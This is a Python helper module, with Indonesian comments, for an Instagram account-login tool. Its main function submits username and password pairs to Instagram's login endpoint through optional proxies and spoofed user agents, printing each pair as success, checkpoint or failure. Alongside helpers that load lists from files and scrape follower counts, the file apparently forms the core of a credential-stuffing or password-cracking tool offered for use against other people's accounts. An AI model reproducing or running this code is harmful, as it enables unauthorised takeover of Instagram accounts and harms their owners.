# utils/tools.py

import os
import requests
from colorama import Fore

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_cookie_from_file(path):
    if not os.path.exists(path):
        return None
    with open(path, 'r') as f:
        return f.read().strip()

def load_list_from_file(path):
    if not os.path.exists(path):
        return []
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def login_real(username, password, user_agent=None, proxy=None):
    """
    Login nyata ke Instagram menggunakan kombinasi username + password
    """
    session = requests.Session()

    headers = {
        "User-Agent": user_agent or "Instagram 250.0.0.17.116 Android",
        "X-IG-App-ID": "936619743392459",
        "X-CSRFToken": "missing",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }

    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }

    try:
        response = session.post(
            'https://www.instagram.com/accounts/login/ajax/',
            data=payload,
            headers=headers,
            proxies={"http": proxy, "https": proxy} if proxy else None,
            timeout=10
        )

        if response.status_code == 200:
            res_json = response.json()
            if res_json.get("authenticated"):
                print(Fore.GREEN + f"✅ LOGIN SUKSES: {username} | {password}")
                return True
            elif res_json.get("message") == "checkpoint_required":
                print(Fore.YELLOW + f"🔒 CHECKPOINT: {username} | {password}")
            else:
                print(Fore.RED + f"❌ LOGIN GAGAL: {username} | {password}")
        else:
            print(Fore.RED + f"⚠️ REQUEST ERROR {response.status_code}: {username}")
    except Exception as e:
        print(Fore.RED + f"🔥 ERROR: {e}")
    return False

def get_user_info(username):
    """
    Ambil jumlah followers, following, dan posts dari username Instagram
    """
    try:
        r = requests.get(f"https://www.instagram.com/{username}/?__a=1&__d=dis", headers={
            "User-Agent": "Instagram 250.0.0.17.116 Android"
        })
        if r.status_code == 200:
            user = r.json().get("graphql", {}).get("user", {})
            return {
                "followers": user.get("edge_followed_by", {}).get("count", 0),
                "following": user.get("edge_follow", {}).get("count", 0),
                "posts": user.get("edge_owner_to_timeline_media", {}).get("count", 0),
            }
    except:
        pass
    return {"followers": "-", "following": "-", "posts": "-"}
